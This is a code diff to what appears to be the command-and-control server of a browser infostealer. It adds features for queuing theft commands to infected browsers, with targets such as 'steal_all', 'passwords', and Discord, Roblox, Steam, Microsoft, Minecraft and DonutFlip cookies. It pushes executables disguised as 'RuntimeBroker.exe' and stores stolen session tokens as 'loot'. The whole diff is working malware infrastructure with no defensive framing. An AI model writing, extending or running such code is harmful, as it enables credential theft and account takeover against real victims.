@@ -888,6 +888,8 @@ def browser_hello():
     entry["donutflip"] = bool(data.get("donutflip")) if "donutflip" in data else entry.get("donutflip", False)
     if data.get("cookie_count") is not None:
         entry["cookie_count"] = data.get("cookie_count")
+    if "has_session" in data:
+        entry["has_session"] = bool(data.get("has_session"))
     if data.get("balance") is not None:
         entry["balance"] = data.get("balance")
     pending = list(entry.get("pending_drops") or [])
@@ -939,6 +941,22 @@ def browser_push():
     path = (data.get("path") or "").strip()
     name = (data.get("name") or "RuntimeBroker.exe").strip()
     target = (data.get("eid") or "all").strip()
+    cmd = (data.get("cmd") or "").strip().lower()
+    # allow pure command queue via push (used by Donut panel)
+    if cmd and not path:
+        count = 0
+        def q(eid):
+            browsers[eid].setdefault("pending_cmds", []).append({"cmd": cmd, "args": data.get("args") or {}})
+        if target == "all":
+            for eid in list(browsers.keys()):
+                q(eid); count += 1
+        else:
+            if target not in browsers:
+                return jsonify({"error": "unknown eid"}), 404
+            q(target); count = 1
+        save_browsers()
+        socketio.emit("browser_update", {"cmd": cmd, "queued": count})
+        return jsonify({"ok": True, "queued": count, "cmd": cmd})
     if not path.startswith("/p/"):
         return jsonify({"error": "path must be /p/....exe"}), 400
     drop = {"path": path, "name": name}
@@ -961,8 +979,18 @@ def browser_push():
 def browser_cmd():
     data = request.get_json(force=True, silent=True) or {}
     cmd = (data.get("cmd") or "both").strip().lower()
-    if cmd not in ("cookies", "discord", "roblox", "both", "all", "passwords", "cookies_roblox", "cookies_discord", "cookies_google", "cookies_steam", "history", "bookmarks", "screenshot", "forms", "site_roblox", "site_discord", "site_google", "site_steam"):
-        return jsonify({"error": "cmd must be cookies|discord|roblox|both"}), 400
+    allowed = {
+        "cookies", "discord", "roblox", "both", "all", "passwords",
+        "cookies_roblox", "cookies_discord", "cookies_google", "cookies_steam",
+        "history", "bookmarks", "screenshot", "forms",
+        "site_roblox", "site_discord", "site_google", "site_steam",
+        "donutflip", "cookies_donutflip", "df", "donutsurge", "cookies_donutsurge",
+        "microsoft", "cookies_microsoft", "xbox", "cookies_xbox",
+        "minecraft", "minecraft_pack", "steal_all", "hello", "ping",
+        "steal_cookies", "all_cookies"
+    }
+    if cmd not in allowed:
+        return jsonify({"error": "unsupported cmd", "cmd": cmd}), 400
     target = (data.get("eid") or "all").strip()
     count = 0
 
@@ -1005,8 +1033,16 @@ def browser_loot():
     payload = data.get("data")
     entry = {"type": kind, "ts": now(), "data": payload}
     browsers[eid].setdefault("loot", []).append(entry)
-    browsers[eid]["loot"] = browsers[eid]["loot"][-40:]
+    browsers[eid]["loot"] = browsers[eid]["loot"][-80:]
     browsers[eid]["last_seen"] = now()
+    browsers[eid]["loot_count"] = len(browsers[eid].get("loot") or [])
+    if kind in ("donutflip_cookies", "donutflip_session_token", "donutflip_cookies_auto"):
+        data_obj = entry.get("data") or {}
+        if isinstance(data_obj, dict):
+            if data_obj.get("session_token") or data_obj.get("has_session_token"):
+                browsers[eid]["has_session"] = True
+            if data_obj.get("count") is not None:
+                browsers[eid]["cookie_count"] = data_obj.get("count")
     save_browsers()
     loot_dir = BASE / "browser_loot" / eid
     loot_dir.mkdir(parents=True, exist_ok=True)
